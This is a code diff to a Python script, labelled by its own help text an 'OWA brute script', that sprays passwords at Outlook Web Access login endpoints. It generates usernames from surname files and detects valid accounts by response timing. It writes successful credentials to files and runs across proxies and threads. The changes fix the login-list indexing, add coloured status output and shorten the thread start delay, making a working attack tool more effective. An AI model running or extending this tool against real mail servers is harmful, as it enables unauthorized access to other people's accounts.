@@ -6,6 +6,7 @@ from string import ascii_lowercase
 from time import sleep
 from re import match
 from random import choice
+from platform import system
 import requests
 import os
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -119,6 +120,28 @@ user_agent_list = [
 ]
 
 
+class ConsoleOutput:
+    info = None
+    error = None
+    success = None
+    warning = None
+
+    def __init__(self):
+        self.check_platform()
+
+    def check_platform(self):
+        if system() == "Linux":
+            self.info = '\033[1;34m' + '[*]' + '\033[0m' + ' '
+            self.error = '\033[1;31m' + '[-]' + '\033[0m' + ' '
+            self.success = '\033[1;32m' + '[+]' + '\033[0m' + ' '
+            self.warning = '\033[1;33m' + '[!]' + '\033[0m' + ' '
+        else:
+            self.info = '[*] '
+            self.error = '[-] '
+            self.success = '[+] '
+            self.warning = '[!] '
+
+
 def create_login_list(country='ru'):
     try:
         surnames_file = open(os.getcwd() + '/surnames/' + country.lower() + '.txt')
@@ -143,7 +166,7 @@ def create_login_list(country='ru'):
                 if surname.endswith('iy'):
                     login_list.append(name + '.' + surname[:-2] + 'aya')
                 else:
-                    login_list.append(surname + 'a')
+                    login_list.append(name + '.' + surname + 'a')
 
         surname = surnames_file.readline()
     surnames_file.close()
@@ -152,11 +175,9 @@ def create_login_list(country='ru'):
 def brute(**positions):
     start_position = int(positions['start'])
     stop_position = int(positions['stop'])
-    interval = stop_position - start_position
 
     # stdout.write("Start position: " + str(start_position) + "\n")
     # stdout.write("Stop position: " + str(stop_position) + "\n")
-    # stdout.write("Interval: " + str(interval) + "\n")
 
     global url
     global proto
@@ -177,6 +198,8 @@ def brute(**positions):
 
     global user_agent_list
 
+    output = ConsoleOutput()
+
     if url.endswith('/'):
         url = url + 'owa/auth.owa'
     elif url.endswith('/auth.owa'):
@@ -192,17 +215,18 @@ def brute(**positions):
         "Connection": "close"
     }
 
-    for index in range(interval):
-        brute_index = start_position + index - 1
+    for index in range(start_position - 1, stop_position, 1):
         for password in password_list:
             data = {
                 "destination": proto + "://" + host + "/owa",
                 "flags": "4",
                 "forcedownlevel": "0",
-                "username": login_list[brute_index],
+                "username": login_list[index],
                 "password": password,
                 "isUtf8": "1"
             }
+
+            # stdout.write(output.info + "Check: " + login_list[index] + " " + password + "\n")
 
             try:
                 if proxy is not None:
@@ -214,23 +238,25 @@ def brute(**positions):
 
                 if response.status_code == 302:
                     if "Set-Cookie" in response.headers.keys():
-                        stdout.write("Successful login: " + login_list[brute_index] + " " + password + "\n")
+                        stdout.write(output.success + "Successful login: " + login_list[index] + " " + password + "\n")
                         with open(successful_login_file, "a") as out_file:
-                            out_file.write(login_list[brute_index] + " " + password + "\n")
+                            out_file.write(login_list[index] + " " + password + "\n")
                     else:
                         if response.elapsed.total_seconds() < validate_timeout:
-                            stdout.write("User exist: " + login_list[brute_index] + "\n")
+                            stdout.write(output.info + "User exist: " + login_list[index] + "\n")
                             with open(valid_login_file, "a") as out_file:
-                                out_file.write(login_list[brute_index] + "\n")
+                                out_file.write(login_list[index] + "\n")
                         else:
                             if verbose:
-                                stdout.write("User does not exist: " + login_list[brute_index] + "\n")
+                                stdout.write(output.error + "User does not exist: " + login_list[index] + "\n")
             except Timeout:
                 if verbose:
-                    stdout.write("User does not exist: " + login_list[brute_index] + "\n")
+                    stdout.write(output.error + "User does not exist: " + login_list[index] + "\n")
 
 
 if __name__ == "__main__":
+    output = ConsoleOutput()
+
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
     parser = ArgumentParser(description='OWA brute script')
@@ -251,7 +277,7 @@ if __name__ == "__main__":
         verbose = True
 
     if args.url is None:
-        print "Please set URL (example: https://owa.test.com/)"
+        print output.error + "Please set URL (example: https://owa.test.com/)"
         exit(1)
     else:
         try:
@@ -261,10 +287,11 @@ if __name__ == "__main__":
             port = re.group('port')
             path = re.group('path')
         except AttributeError:
-            print "Bad URL! Normal URL example: https://owa.test.com/"
+            print output.error + "Bad URL! Normal URL example: https://owa.test.com/"
             exit(1)
 
         url = args.url
+        print output.info + "URL: " + url
 
     if args.proxy is not None:
         try:
@@ -273,16 +300,17 @@ if __name__ == "__main__":
                 proxy = {re.group('proto'): str(re.group('host')) + str(re.group('port'))}
             else:
                 proxy = {re.group('proto'): str(re.group('host'))}
+            print output.info + "Proxy: " + args.proxy
         except AttributeError:
-            print "Bad Proxy! Normal Proxy example: https://127.0.0.1:8080"
+            print output.error + "Bad Proxy! Normal Proxy example: https://127.0.0.1:8080"
             exit(1)
 
     if args.country is None:
-        print "Please set Country code (2 letters, example: RU)"
+        print output.error + "Please set Country code (2 letters, example: RU)"
         exit(1)
     else:
         if len(args.country) != 2:
-            print "Bad Country code (2 letters, example: RU)"
+            print output.error + "Bad Country code (2 letters, example: RU)"
             exit(1)
         else:
             create_login_list(args.country)
@@ -290,24 +318,30 @@ if __name__ == "__main__":
     timeout = int(args.timeout)
 
     login_list_len = len(login_list)
-    print "Login list size: " + str(login_list_len)
+    print output.info + "Login list size: " + str(login_list_len)
 
     valid_login_file = host + "_" + valid_login_file
     successful_login_file = host + "_" + successful_login_file
 
+    print output.info + "Valid logins write to file: " + valid_login_file
+    print output.info + "Successful login credentials write to file: " + valid_login_file
+
     if args.user_enumeration:
         password_list = []
         password_list.append(args.default_pass)
+        print output.info + "Start users enumeration, default password: " + args.default_pass
+
+    print output.info + "Number of threads: " + str(args.threads)
+    print output.info + "Start brute ..."
 
     if args.threads > 1:
-        print "Create threads ..."
         tm = ThreadManager(args.threads + 1)
         step = int(login_list_len / args.threads)
 
         for thread in range(1, args.threads + 1):
             positions = {"start": (step*(thread-1)) + 1, "stop": step*thread}
             tm.add_task(brute, **positions)
-            sleep(3)
+            sleep(1)
 
         tm.wait_for_completion()
     else:
